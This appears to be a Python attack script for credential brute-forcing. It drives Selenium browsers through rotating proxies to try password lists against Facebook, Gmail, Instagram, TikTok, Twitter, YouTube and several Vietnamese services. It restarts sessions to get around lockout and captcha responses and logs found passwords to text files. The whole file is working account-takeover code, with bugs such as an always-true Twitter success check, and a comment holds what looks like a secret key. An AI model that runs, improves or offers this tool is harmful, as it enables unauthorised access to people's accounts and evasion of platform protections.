#!/usr/bin/python
# -*- coding: utf-8 -*-
from ast import For
import smtplib
import threading
from optparse import *
import time
import sys
import io
import os
from GetProxy import getProxies
try:
    from selenium import webdriver
except:
    os.system("pip install selenium")
from selenium.webdriver.common.proxy import Proxy, ProxyType
from webdriver_manager.firefox import GeckoDriverManager
from selenium.webdriver.common.by import By
import selenium.common.exceptions
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.firefox.options import Options
try:
    import requests
except:
    os.system("pip install requests")
try:
    from colorama import Fore, Back, Style
except:
    os.system("pip install colorama")
use = OptionParser("""{}
============================================================================================
-> --getproxylist                   export_filename (E.x: proxy_list.txt)
-~ --type                           Type Social media (E.x: facebook or facebook|instagram)
-< --loadproxylist                  import_filename
-g --gmail                          ACCOUNT gmail @gmail.com
-y --youtube                        ACCOUNT youtube @
-t --tiktok                         ACCOUNT tiktok @
-T --twitter                        ACCOUNT twitter @
-f --facebook                       ACCOUNT facebook @
-i --instagram                      Account instagram
-G --gapo                           ACCOUNT gapo
-b --biztime                        ACCOUNT biztime
-H --hahalolo                       ACCOUNT hahalolo
-l --list                           List    Password BruteForce
-h --help                           Show this help message and exit
============================================================================================
{}""".format(Fore.LIGHTCYAN_EX, Fore.RESET))

use.add_option("->", "--getproxylist", dest="getproxylist",
               help="Export list proxy from website")
use.add_option("-~", "--type", dest="type",
               help="Type Social Media")
use.add_option("-<", "--loadProxyList", dest="loadproxylist",
               help="Import list proxy from file")
use.add_option("-g", "--gmail", dest="gmail",
               help="Write Your Account Gmail")
use.add_option("-y", "--youtube", dest="youtube",
               help="Write Your Account Youtube")
use.add_option("-t", "--tiktok", dest="tiktok",
               help="Write Your Account Tiktok")
use.add_option("-T", "--twitter", dest="twitter",
               help="Write Your Account Twitter")
use.add_option("-f", "--facebook", dest="facebook",
               help="Write Your Account Facebook")
use.add_option("-i", "--instagram", dest="instagram",
               help="Write Your Account Instagram")
use.add_option("-G", "--gapo", dest="gapo",
               help="Write Your Account Gapo")
use.add_option("-b", "--biztime", dest="biztime",
               help="Write Your Account Biztime")
use.add_option("-H", "--hahalolo", dest="hahalolo",
               help="Write Your Account Hahalolo")
use.add_option("-l", "--list", dest="list_password",
               help="Write Your list password")
(options, args) = use.parse_args()
# ===============================Get Proxy List============================


def getProxyList():
    getProxies(options.getproxylist, options.type)


    # =================================LOAD PROXY==============================
proxy_list = []


def load_proxy_list(socialname):
    while True:
        try:
            proxies = io.open(options.loadproxylist,
                              "r").readlines().pop().split(',')
            for i in range(0, len(proxies)-1):
                element_proxy = proxies[i].split('-')
                if element_proxy[0] == socialname:
                    proxy_list.append(element_proxy[1])
            break
        except:
            print(Fore.LIGHTMAGENTA_EX+"[i] File proxy error"+Fore.RESET)
            time.sleep(30)
# ==============================CHANGE PROXY===============================


def changeProxy(socialname):
    while True:
        if len(proxy_list) == 0:
            load_proxy_list(socialname)
        try:
            myproxy = proxy_list.pop(0)
            requests.get(url_list[social_name.index(socialname)],
                         proxies={'https': myproxy, 'http': myproxy}, timeout=1)
            print(Fore.LIGHTGREEN_EX+"[V]"+"-> "+myproxy+Fore.RESET)
            proxy = Proxy()
            proxy.proxy_type = ProxyType.MANUAL
            proxy.http_proxy = myproxy
            proxy.ssl_proxy = myproxy
            capabilities = webdriver.DesiredCapabilities.FIREFOX
            proxy.add_to_capabilities(capabilities)
            return capabilities
        except KeyboardInterrupt:
            break
        except requests.exceptions.ConnectionError:
            print(Fore.LIGHTRED_EX+"[X]"+"-> "+myproxy+Fore.RESET)
            continue
        except:
            print(Fore.LIGHTRED_EX +
                  "[!] Change proxy Error. Again..."+Fore.RESET)
            break


# ==========================LOAD PASSWORD LIST=============================
password_list = []


def load_password_list():
    for passwd in io.open(options.list_password, "r").readlines():
        password_list.append(passwd.rstrip("\n"))
# ============================FACEBOOK=====================================


def facebook():
    count_while = 0
    count_login = 0
    print("{}Facebook Account: {}".format(R, options.facebook))
    print("{}<<<<<<+++++Start Attacking Facebook+++++>>>>>{}".format(Fore.LIGHTRED_EX, Fore.RESET))
    while count_while < len(password_list):
        try:
            password = password_list[count_while]
            if count_login % 10 == 0:
                brows = webdriver.Firefox(
                    desired_capabilities=changeProxy('facebook'))
                brows.set_page_load_timeout(30)
                brows.implicitly_wait(5)
                brows.get("https://facebook.com/login")
                try:
                    brows.find_element(
                        By.XPATH, "//*[@id='facebook']/body/div[3]/div[2]/div/div/div/div/div[3]/button[2]").click()
                except:
                    print
                try:
                    brows.find_element(
                        By.XPATH, "//div[@id='content']/div/div/div[3]/div/div/label/input").click()
                    count_login = 0
                    continue
                except:
                    print
            brows.find_element(By.ID, "email").send_keys(options.facebook)
            print(Fore.LIGHTYELLOW_EX +
                  'Password [==] '+password+Fore.RESET)
            brows.find_element(By.ID, "pass").send_keys(
                password)
            brows.find_element(By.ID, "loginbutton").click()
            try:
                if brows.find_element(By.XPATH, "//div[@id='error_box']/div").text == "Access Denied":
                    count_login = 0
                    continue
            except:
                count_login
            if 'https://www.facebook.com/?sk=welcome' in brows.current_url or 'https://www.facebook.com/checkpoint' in brows.current_url:
                print("{}[V] Password Found [{}]{}".format(
                    Fore.LIGHTGREEN_EX, password, Fore.RESET))
                io.open("Facebook.txt", "a").write(
                    options.facebook+":"+password_list[count_login]+"\n")
                break
            print(Fore.LIGHTRED_EX+"[X] "+password+Fore.RESET)
            count_login += 1
            count_while += 1
        except (TimeoutException, selenium.common.exceptions.WebDriverException, selenium.common.exceptions.NoSuchWindowException, selenium.common.exceptions.NoSuchElementException):
            print(Fore.LIGHTMAGENTA_EX +
                  '[!] Brute Force Error!!!. Again'+Fore.RESET)
            brows.quit()
            count_login = 0
            continue
        except Exception as e:
            print(e)
            print(Fore.LIGHTMAGENTA_EX +
                  '[!] Brute Fore Stopping...'+Fore.RESET)
            brows.quit()
            break

# ==================================YOUTUBE======================================

# //*[@id='content']/div/div[6]/div/ytd-button-renderer/a/tp-yt-paper-button Chấp nhận tất cả


def youtube():
    print("Youtube Account: {}".format(options.youtube))
    print("{}<<<<<<+++++Start  Attacking Youtube+++++>>>>>{}".format(Fore.LIGHTRED_EX, Fore.RESET))
    brows = webdriver.Firefox(executable_path=r"geckodriver.exe")
    brows.get("https://www.youtube.com/")
    try:
        brows.find_element(
            By.XPATH, "//*[@id='topbar']/div[2]/div[2]/ytd-button-renderer/a").click()
        brows.find_element(
            By.XPATH, "//*[@id='buttons']/ytd-button-renderer").click()
    except Exception as e:
        print(e)
    brows.implicitly_wait(5)
    brows.find_element(By.ID, "identifierId").send_keys(options.youtube)
    brows.find_element(By.ID, "identifierNext").click()
    brows.implicitly_wait(5)
    for password in io.open(options.list_password, "r").readlines():
        password = password.rstrip('\n')
        print('\rPassword [==] {} '.format(password).rstrip("\n"))
        sys.stdout.flush
        try:
            brows.find_element(
                By.XPATH, "//*[@id='password']/div/div/div/input").send_keys(password)
            brows.find_element(By.ID, "loginbutton").click()
            brows.find_element(By.ID, "identifierNext").click()
            if 'https://www.youtube.com' in brows.current_url:
                print("{}[V] {}{}".format(
                    Fore.LIGHTGREEN_EX, password, Fore.RESET))
                io.open("Youtube.txt", "a").write(
                    options.youtube+":"+password+"\n")
                break
            else:
                print("{}[X] {}{}".format(
                    Fore.LIGHTRED_EX, password, Fore.RESET))
        except (TimeoutException, selenium.common.exceptions.WebDriverException, selenium.common.exceptions.NoSuchWindowException, selenium.common.exceptions.NoSuchElementException):
            print(Fore.LIGHTMAGENTA_EX +
                  '[!] Brute Force Error!!!. Again'+Fore.RESET)
            brows.quit()
            count_login = 0
            continue
        except Exception as e:
            print(e)
            print(Fore.LIGHTMAGENTA_EX +
                  '[!] Brute Fore Stopping...'+Fore.RESET)
            brows.quit()
            break


# =================================GMAIL==========================================
# xgevlqrasamvxqwb

def gmail():
    count_while = 0
    print("{}<<<<<<+++++Start Attacking Gmail+++++>>>>>{}".format(Fore.LIGHTRED_EX, Fore.RESET))
    s = smtplib.SMTP_SSL('smtp.gmail.com')
    while count_while < len(password_list):
        password = password_list[count_while]
        count_while += 1
        try:
            s.login(options.gmail, password)
            print("{}[V] Password Found [{}]{}".format(
                Fore.LIGHTGREEN_EX, password, Fore.RESET))
            io.open("Gmail.txt", "a").write(
                options.instagram+":"+password+"\n")
            break
        except smtplib.SMTPAuthenticationError:
            print(Fore.LIGHTRED_EX+"[X] "+password+Fore.RESET)

# ==================================INSTAGRAM===================================


def check_login_instagram(brows):
    try:
        if brows.find_element(By.XPATH, "//*[@id='react-root']/section/nav/div[2]/div/div/div[2]/div/div/span").text == "Tìm kiếm":
            return True
    finally:
        return False


def instagram():
    count_while = 0
    count_login = 0
    print("{}Tiktok Account: {}{}".format(
        Fore.LIGHTYELLOW_EX, options.tiktok, Fore.RESET))
    print("{}<<<<<<+++++Start Attacking Tiktok+++++>>>>>{}".format(Fore.LIGHTRED_EX, Fore.RESET))
    while count_while < len(password_list):
        password = password_list[count_while]
        try:
            password = password_list[count_while]
            if len(password) < 6:
                count_while += 1
                print(Fore.LIGHTRED_EX+"[!] "+password+Fore.RESET)
                continue
            if count_login == 0:
                brows = webdriver.Firefox(
                    executable_path=GeckoDriverManager().install())
                brows.get("https://www.instagram.com")
                brows.implicitly_wait(5)
                try:
                    brows.find_element(
                        By.XPATH, "//body/div[4]/div/div/button[1]").click()
                except:
                    print
                brows.find_element(
                    By.XPATH, '//*[@id="loginForm"]/div/div/div/label/input').send_keys(options.instagram)
                count_login = 1
            brows.find_element(
                By.XPATH, '//*[@id="loginForm"]/div/div[2]/div/label/input').send_keys(password)
            brows.find_element(
                By.XPATH, '//*[@id="loginForm"]/div/div[3]/button').click()
            time.sleep(5)
            if 'https://www.instagram.com/challenge' in brows.current_url or "https://www.instagram.com/accounts" in brows.current_url or check_login_instagram(brows):
                print("{}[V] Password Found [{}]{}".format(
                    Fore.LIGHTGREEN_EX, password, Fore.RESET))
                io.open("Instagram.txt", "a").write(
                    options.instagram+":"+password+"\n")
                break
            else:
                print("{}[X] {}{}".format(
                    Fore.LIGHTRED_EX, password, Fore.RESET))
            # try:
            #     if brows.find_element(By.XPATH, '//*[@id="slfErrorAlert"]').text == "Chúng tôi không thể kết nối với Instagram. Đảm bảo bạn được kết nối Internet và thử lại.":
            #         brows.quit()
            #         brows = run_web_instagram()
            # except:
            #     print()
            count_while += 1
            brows.find_element(
                By.XPATH, '//*[@id="loginForm"]/div/div[2]/div/label/input').clear()
        except (TimeoutException, selenium.common.exceptions.WebDriverException, selenium.common.exceptions.NoSuchWindowException, selenium.common.exceptions.NoSuchElementException):
            print(Fore.LIGHTMAGENTA_EX +
                  '[!] Brute Force Error!!!. Again'+Fore.RESET)
            brows.quit()
            count_login = 0
            continue
        except Exception as e:
            print(e)
            print(Fore.LIGHTMAGENTA_EX +
                  '[!] Brute Fore Stopping...'+Fore.RESET)
            brows.quit()
            break


# =================================TIKTOK======================================
def check_login_tiktok(brows):
    try:
        brows.find_element(By.XPATH, "//*[@id='app']/div/div/div/div/form")
        return True
    except:
        return False


def tiktok():
    count_while = 0
    count_login = 0
    print("{}Tiktok Account: {}{}".format(
        Fore.LIGHTYELLOW_EX, options.tiktok, Fore.RESET))
    print("{}<<<<<<+++++Start Attacking Tiktok+++++>>>>>{}".format(Fore.LIGHTRED_EX, Fore.RESET))
    while count_while < len(password_list):
        password = password_list[count_while]
        try:
            password = password_list[count_while]
            if count_login == 0:
                brows = webdriver.Firefox(
                    desired_capabilities=changeProxy('twitter'))
                brows.set_page_load_timeout(30)
                brows.implicitly_wait(5)
                brows.get("https://www.tiktok.com/login/phone-or-email/email")
                brows.find_element(
                    By.XPATH, "//*[@id='loginContainer']/div/form/div/input").send_keys(options.tiktok)
                count_login = 1
            brows.find_element(
                By.XPATH, "//*[@id='loginContainer']/div/form/div[2]/div/input").send_keys(password)
            brows.find_element(
                By.XPATH, "//*[@id='loginContainer']/div/form/button").click()
            if "https://www.tiktok.com/foryou" in brows.current_url or check_login_tiktok(brows):
                print("{}[V] Password Found [{}]{}".format(
                    Fore.LIGHTGREEN_EX, password, Fore.RESET))
                io.open("Tiktok.txt", "a").write(
                    options.tiktok+":"+password+"\n")
                break
            else:
                print(Fore.LIGHTRED_EX+"[X] "+password+Fore.RESET)
            brows.find_element(
                By.XPATH, "//*[@id='loginContainer']/div/form/button").clear()
            count_while += 1
        except (TimeoutException, selenium.common.exceptions.WebDriverException, selenium.common.exceptions.NoSuchWindowException, selenium.common.exceptions.NoSuchElementException):
            print(Fore.LIGHTRED_EX+"[X] "+password+Fore.RESET)
            brows.quit()
            count_login = 0
            continue
        except Exception as e:
            print(e)
            print(Fore.LIGHTMAGENTA_EX +
                  '[!] Brute Fore Stopping...'+Fore.RESET)
            brows.quit()
            break


# =================================TWITTER======================================
# Complete
PASS_PATH_TWITTER = "//input[@autocomplete='current-password']"
SUBMIT_PATH_TWITTER = '//*[@id="layers"]/div/div/div/div/div/div/div[2]/div[2]/div/div/div[2]/div[2]/div[2]/div/div/div/div'


def check_login_twitter(brows):
    try:
        if "Xác nhận danh tính của bạn bằng cách nhập địa chỉ email liên kết với tài khoản Twitter của bạn." in brows.find_element(
                By.XPATH, "//div[@id='react-root']/div/div/div/div/div/div/div/div/div/div[2]/div[2]/div/div/div[2]/div[2]/div/div/div/div/div[1]/div[1]/div/span/span").text:
            return True
        return False
    except Exception as e:
        print(e)
        return False


def twitter():
    count_while = 0
    count_login = 0
    print("{}Twitter Account: {}{}".format(
        Fore.LIGHTYELLOW_EX, options.twitter, Fore.RESET))
    print("{}<<<<<<+++++Start Attacking Twitter+++++>>>>>{}".format(Fore.LIGHTRED_EX, Fore.RESET))
    while count_while < len(password_list):
        try:
            password = password_list[count_while]
            if count_login == 0:
                brows = webdriver.Firefox(
                    desired_capabilities=changeProxy('twitter'))
                brows.set_page_load_timeout(30)
                brows.implicitly_wait(5)
                brows.get("https://twitter.com/i/flow/login")
                brows.find_element(By.NAME, "text").send_keys(options.twitter)
                brows.find_element(
                    By.XPATH, "//*[@id='layers']/div/div/div/div/div/div/div[2]/div[2]/div/div/div[2]/div[2]/div[1]/div/div/div[6]").click()
                count_login = 1
            print(Fore.LIGHTYELLOW_EX +
                  'Password [==] '+password+Fore.RESET)
            brows.find_element(
                By.XPATH, PASS_PATH_TWITTER).send_keys(password)
            brows.find_element(By.XPATH, SUBMIT_PATH_TWITTER).click()
            # try:
            #     brows.find_element(By.XPATH, "//div[@role='button']")
            #     brows.quit()
            #     count_login = 0
            #     continue
            # except:
            #     print
            time.sleep(2)
            if brows.current_url == "https://twitter.com/" or brows.current_url == "https://twitter.com/home" or 'https://twitter.com/account/login_challenge' or check_login_twitter(brows) in brows.current_url:
                print("{}[V] Password Found [{}]{}".format(
                    Fore.LIGHTGREEN_EX, password, Fore.RESET))
                io.open("Twitter.txt", "a").write(
                    options.twitter+":"+password+"\n")
                break
            else:
                print(Fore.LIGHTRED_EX+"[X] "+password+Fore.RESET)
            count_while += 1
        except (TimeoutException, selenium.common.exceptions.WebDriverException, selenium.common.exceptions.NoSuchWindowException, selenium.common.exceptions.NoSuchElementException):
            print(Fore.LIGHTMAGENTA_EX +
                  '[!] Brute Force Error!!!. Again'+Fore.RESET)
            brows.quit()
            count_login = 0
            continue
        except Exception as e:
            print(e)
            print(Fore.LIGHTMAGENTA_EX +
                  '[!] Brute Fore Stopping...'+Fore.RESET)
            brows.quit()
            break

# =================================GAPO======================================
# Complete


def gapo():
    count_while = 0
    count_login = 0
    print("{}Gapo Account: {}{}".format(
        Fore.LIGHTYELLOW_EX, options.gapo, Fore.RESET))
    print("{}<<<<<<+++++Start Attacking Gapo+++++>>>>>{}".format(Fore.LIGHTRED_EX, Fore.RESET))
    path = "//div[@id='root']/div[2]/div/div[2]/"
    while count_while < len(password_list):
        try:
            password = password_list[count_while]
            if len(password) < 8 or len(password) > 50:
                count_while += 1
                print(Fore.LIGHTRED_EX+"[!] "+password+Fore.RESET)
                continue
            if count_login == 0:
                brows = webdriver.Firefox(
                    desired_capabilities=changeProxy('gapo'))
                brows.set_page_load_timeout(30)
                brows.implicitly_wait(5)
                brows.get("https://www.gapo.vn/login")
                brows.find_element(
                    By.XPATH, path+"div[3]/input").send_keys(options.gapo)
                brows.find_element(By.XPATH, path+"button").click()
                count_login = 1
            print(Fore.LIGHTYELLOW_EX +
                  'Password [==] '+password+Fore.RESET)
            brows.find_element(
                By.XPATH, path+"div[2]/input").send_keys(password)
            brows.find_element(By.XPATH, path+"button").click()
            try:
                if brows.find_element(By.XPATH, "//div[@class='modal-body']").text == "Bạn đã đạt giới hạn số lần đăng nhập. Bạn vui lòng thử lại sau!":
                    brows.quit()
                    count_login = 0
                    continue
                brows.find_element(
                    By.XPATH, "//button[@class='btn btn-sm btn-primary']").click()
                brows.find_element(By.XPATH, path+"div[2]/input").clear()
                print(Fore.LIGHTRED_EX+"[X] "+password+Fore.RESET)
                count_while += 1
            except selenium.common.exceptions.NoSuchElementException:
                print("{}[V] Password Found [{}]{}".format(
                    Fore.LIGHTGREEN_EX, password, Fore.RESET))
                io.open("Gapo.txt", "a").write(options.gapo+":"+password+"\n")
                brows.quit()
                break
        except (TimeoutException, selenium.common.exceptions.WebDriverException, selenium.common.exceptions.NoSuchWindowException, selenium.common.exceptions.NoSuchElementException):
            print(Fore.LIGHTMAGENTA_EX +
                  '[!] Brute Force Error!!!. Again'+Fore.RESET)
            brows.quit()
            count_login = 0
            continue
        except Exception as e:
            print(e)
            print(Fore.LIGHTMAGENTA_EX +
                  '[!] Brute Fore Stopping...'+Fore.RESET)
            brows.quit()
            break
# =================================BIZTIME======================================
# Complete


def check_login_biztime(brows):
    try:
        brows.implicitly_wait(1)
        brows.find_element(
            By.XPATH, "//div[@class='valign tag_auth_animation']")
        return True
    except:
        return False


def biztime():
    count_while = 0
    count_login = 0
    print("{}Biztime Account: {}{}".format(
        Fore.LIGHTYELLOW_EX, options.biztime, Fore.RESET))
    print("{}<<<<<<+++++Start Attacking Biztime+++++>>>>>{}".format(Fore.LIGHTRED_EX, Fore.RESET))
    op = Options()
    # op.headless = True
    while count_while < len(password_list):
        try:
            password = password_list[count_while]
            if count_login == 0:
                brows = webdriver.Firefox(
                    desired_capabilities=changeProxy('biztime'))
                brows.set_page_load_timeout(30)
                brows.implicitly_wait(5)
                brows.get("https://biztime.com.vn/")
                brows.find_element(By.NAME, "username").send_keys(
                    options.biztime)
                count_login = 1
            print(Fore.LIGHTYELLOW_EX +
                  'Password [==] '+password+Fore.RESET)
            brows.find_element(By.NAME, "password").send_keys(password)
            brows.find_element(
                By.XPATH, "//button[@class='btn btn-main btn-mat disable_btn tag_wel_btn']").click()
            if check_login_biztime(brows):
                print(
                    "{}[V] Password Found [{}]{}".format(Fore.LIGHTGREEN_EX, password, Fore.RESET))
                io.open("Biztime.txt", "a").write(
                    options.biztime+":"+password+"\n")
                brows.quit()
                break
            else:
                if brows.find_element(By.XPATH, "//div[@class='errors']").text == "Tạm khóa 10 phút do bạn đăng nhập sai nhiều lần!":
                    brows.quit()
                    count_login = 0
                    continue
                brows.find_element(By.NAME, "password").clear()
                print(Fore.LIGHTRED_EX+"[X] "+password+Fore.RESET)
                count_while += 1
        except (TimeoutException, selenium.common.exceptions.WebDriverException, selenium.common.exceptions.NoSuchWindowException, selenium.common.exceptions.NoSuchElementException):
            print(Fore.LIGHTMAGENTA_EX +
                  '[!] Brute Force Error!!!. Again'+Fore.RESET)
            brows.quit()
            count_login = 0
            continue
        except Exception as e:
            print(e)
            print(Fore.LIGHTMAGENTA_EX +
                  '[!] Brute Fore Stopping...'+Fore.RESET)
            brows.quit()
            break
# =================================HAHALOLO======================================
# Complete


def hahalolo():
    count_while = 0
    count_login = 0
    print("\rHahalolo Account: {}".format(options.hahalolo))
    print("{}<<<<<<+++++Start Attacking Hahalolo++++>>>>>{}".format(Fore.LIGHTRED_EX, Fore.RESET))
    while count_while < len(password_list):
        try:
            password = password_list[count_while]
            if count_login == 0:
                brows = webdriver.Firefox(
                    desired_capabilities=changeProxy('hahalolo'))
                brows.set_page_load_timeout(30)
                brows.implicitly_wait(5)
                brows.get("https://accounts.hahalolo.com/sign-in/")
                try:
                    brows.find_element(By.ID, "accountId").send_keys(
                        options.hahalolo)
                except:
                    brows.quit()
                    count_login = 0
                    continue
                count_login = 1
            print(Fore.LIGHTYELLOW_EX +
                  'Password [==] '+password+Fore.RESET)
            brows.find_element(By.ID, "password").send_keys(password)
            brows.find_element(
                By.XPATH, "//div[@id='app']/div/div/div/div/div[2]/div/div/div/div[2]").click()
            try:
                brows.find_element(By.ID, "captcha-code")
                count_login = 0
                brows.quit()
                continue
            except:
                count_login
            brows.find_element(By.ID, "password").clear()
            print(Fore.LIGHTRED_EX+"[X] "+password+Fore.RESET)
            count_while += 1
        except selenium.common.exceptions.NoSuchElementException:
            print(
                "{}[V] Password Found [{}]{}".format(Fore.LIGHTGREEN_EX, password, Fore.RESET))
            io.open("Hahalolo.txt", "a").write(
                options.hahalolo+":"+password+"\n")
            brows.quit()
            break
        except (TimeoutException, selenium.common.exceptions.WebDriverException, selenium.common.exceptions.NoSuchWindowException, selenium.common.exceptions.NoSuchElementException):
            print(Fore.LIGHTMAGENTA_EX +
                  '[!] Brute Force Error!!!. Again'+Fore.RESET)
            brows.quit()
            count_login = 0
            continue
        except Exception as e:
            print(e)
            print(Fore.LIGHTMAGENTA_EX +
                  '[!] Brute Fore Stopping...'+Fore.RESET)
            brows.quit()
            break
# ===============================CONTROL======================================


try:
    if options.list_password != None:
        load_password_list()
    check = False
    if options.getproxylist != None:
        getProxyList()
    if options.twitter != None:
        twitter = threading.Thread(target=twitter, name="twitter")
        check = True
        twitter.start()
    if options.tiktok != None:
        tiktok = threading.Thread(target=tiktok, name="tiktok")
        check = True
        tiktok.start()
    if options.youtube != None:
        youtube = threading.Thread(target=youtube, name="youtube")
        check = True
        youtube.start()
    if options.facebook != None:
        facebook = threading.Thread(
            target=facebook, name="facebook")
        check = True
        facebook.start()
    if options.instagram != None:
        instagram = threading.Thread(
            target=instagram, name="Instagram")
        check = True
        instagram.start()
    if options.gmail != None:
        gmail = threading.Thread(target=gmail, name="Gmail")
        check = True
        gmail.start()
    if options.gapo != None:
        gapo = threading.Thread(target=gapo, name="Gapo")
        check = True
        gapo.start()
    if options.biztime != None:
        biztime = threading.Thread(target=biztime, name="Biztime")
        check = True
        biztime.start()
    if options.hahalolo != None:
        hahalolo = threading.Thread(
            target=hahalolo, name="Hahalolo")
        check = True
        hahalolo.start()
    if not check:
        print(use.usage)
        exit()
except:
    sys.exit(0)
